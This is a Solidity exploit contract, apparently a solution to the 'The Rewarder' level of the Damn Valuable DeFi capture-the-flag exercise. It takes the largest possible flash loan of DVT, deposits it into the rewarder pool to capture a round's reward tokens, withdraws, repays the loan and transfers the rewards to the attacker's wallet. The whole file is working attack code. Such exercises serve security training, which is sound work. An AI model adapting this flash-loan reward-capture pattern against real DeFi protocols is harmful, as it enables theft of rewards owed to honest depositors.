// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
import {RewardToken} from "./RewardToken.sol";

contract Attack {
    TheRewarderPool public rewarderPool;
    DamnValuableToken public dvt;
    FlashLoanerPool public flashPool;
    RewardToken public rewardToken;
    address public owner;

    constructor(
        TheRewarderPool rewarderPool_,
        DamnValuableToken dvt_,
        FlashLoanerPool flashPool_,
        RewardToken rewardToken_
    ) {
        rewarderPool = rewarderPool_;
        dvt = dvt_;
        flashPool = flashPool_;
        rewardToken = rewardToken_;
        owner = msg.sender;
    }

    ///@notice take the largest possible flashloan
    function attack() external {
        require(owner == msg.sender, "only owner");

        uint256 dvtAvailable = dvt.balanceOf(address(flashPool));
        flashPool.flashLoan(dvtAvailable);

        // transfer reward tokens to attacker wallet
        uint256 rewards = rewardToken.balanceOf(address(this));
        bool sent = rewardToken.transfer(owner, rewards);
        require(sent, "rewards not sent");
    }

    ///@notice done on new round of rewards
    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashPool), "only flashPool");

        dvt.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);

        // return borrowed tokens to flashPool
        rewarderPool.withdraw(amount);
        bool success = dvt.transfer(address(flashPool), amount);
        require(success, "fLoan not returned");
    }
}
